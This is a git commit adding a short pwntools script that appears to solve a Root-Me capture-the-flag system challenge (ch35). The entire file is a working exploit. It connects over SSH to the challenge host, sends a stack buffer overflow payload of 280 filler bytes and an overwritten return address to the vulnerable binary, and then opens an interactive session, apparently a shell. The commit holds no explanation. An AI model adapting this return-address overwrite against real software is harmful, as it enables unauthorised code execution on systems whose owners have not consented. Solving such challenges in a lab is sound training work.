7ec7845d376049e0a2876561be0b8c29bbd10689
sploitem <34443980+sploitem@users.noreply.github.com>
2018-08-03 16:28:07 +0300

    Create ch35.py

---
+++ root-me/ch35.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python
+from pwn import *
+
+payload = "A" * 280 + "\xd6\x06\x40\x00\x00"
+
+shell = ssh('app-systeme-ch35', 'challenge03.root-me.org', password='app-systeme-ch35', port=2223)
+
+p = shell.run('./ch35')
+
+p.sendline(payload)
+
+p.interactive()
+
+shell.close()
